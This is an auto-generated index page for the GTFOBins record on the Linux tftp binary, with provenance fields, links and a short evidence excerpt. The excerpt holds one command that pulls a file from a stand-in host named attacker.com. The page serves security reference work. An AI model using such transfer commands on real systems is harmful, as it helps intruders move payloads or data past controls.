---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# tftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `tftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for tftp covering download, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/tftp.md)
- Source verification: [source record](../../sources/gtfobins/tftp.md)

## Aliases

- `tftp`

## Source Verification

[source record](../../sources/gtfobins/tftp.md)

## Evidence Excerpt

```text
_body: ''
_name: tftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/tftp
functions:
download:
- code: 'tftp attacker.com
get /path/to/input-file'
contexts:
```
